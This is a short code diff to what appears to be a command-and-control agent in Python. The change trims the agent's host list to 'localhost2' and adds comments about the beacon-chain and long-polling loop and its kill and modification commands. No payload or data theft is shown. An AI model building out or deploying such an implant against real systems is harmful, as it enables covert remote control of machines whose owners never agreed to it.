@@ -530,7 +530,7 @@ class Agent:
 # Note to self, if debugging (remember that one time I know you do) this makes it so that main DOES not run fi this is an import
 if __name__ == "__main__":
     # Execution loop for the agent running at some point this should be what is ran in the executable
-    agent = Agent(["testing.com", "localhost2"])
+    agent = Agent(["localhost2"])
 
     while agent.is_alive():
         # If the modification command boolean is true:
@@ -538,10 +538,11 @@ if __name__ == "__main__":
             # We call continue here os that if the kill command is passed, we terminate
             agent.apply_modification_commands()
             continue
-
+        # TODO: What happens if both of these fail, what is hte backup mechanism?
         # Check to see whether the agent in long polling mode or not
         if agent.is_beacon():
             agent.execute_beacon_chain()
+            # Set to sleep for the beacon chain
         else:
             # This just needs to constantly be called
             while agent.is_alive() and not agent.is_modify():
